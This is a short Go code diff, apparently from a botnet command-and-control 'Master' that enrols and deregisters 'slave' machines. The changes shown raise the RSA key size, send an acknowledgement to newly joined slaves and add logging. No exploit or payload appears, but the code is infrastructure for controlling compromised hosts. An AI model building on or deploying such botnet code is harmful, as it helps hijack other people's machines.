@@ -18,7 +18,7 @@ type Master struct {
 
 // NewMaster is the constructor for a Master
 func NewMaster() (*Master, error) {
-	priv, pub, err := encryption.GenerateRSAKeyPair(4096)
+	priv, pub, err := encryption.GenerateRSAKeyPair(8192)
 	if err != nil {
 		return nil, err
 	}
@@ -48,6 +48,8 @@ func (m *Master) EnrolSlave(slave *SlaveCtrl) {
 	log.Printf("[%s] joined net", slave.id)
 	go slave.writer()
 	go slave.reader()
+	// send ack back to slave
+	slave.MsgChan <- &protocol.Event{Type: protocol.EventTypeAck}
 }
 
 // DeregisterSlave deregisters a slave from a botnet
@@ -61,6 +63,7 @@ func (m *Master) DeregisterSlave(slaveID string) {
 
 func (m *Master) handleMessage(eve *protocol.Event) {
 	//TODO: handle incoming messages from slaves
+	log.Println("received message from slave")
 	log.Println(eve)
 }
 
